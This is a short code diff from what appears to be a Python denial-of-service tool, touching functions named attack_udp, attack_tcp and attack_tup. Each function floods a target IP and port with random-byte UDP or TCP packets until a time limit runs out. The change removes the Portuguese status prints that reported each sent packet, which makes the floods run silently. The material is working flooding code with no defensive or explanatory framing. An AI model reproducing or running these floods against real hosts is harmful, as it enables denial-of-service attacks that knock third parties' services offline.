@@ -305,7 +305,7 @@ def attack_udp(ip, port, secs, size):
         dport = random.randint(1, 65535) if port == 0 else port
         data = random._urandom(size)
         s.sendto(data, (ip, dport))
-        print('Pacote UDP Enviado')
+        
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
@@ -314,7 +314,7 @@ def attack_tcp(ip, port, secs, size):
             s.connect((ip, port))
             while time.time() < secs:
                 s.send(random._urandom(size))
-                print('Pacote TCP Enviado')
+                
         except:
             pass
 
@@ -345,7 +345,7 @@ def attack_tup(ip, port, secs, size):
             tcp.connect((ip, port))
             udp.sendto(data, (ip, dport))
             tcp.send(data)
-            print('Pacote TUP Enviado')
+            
         except:
             pass
 
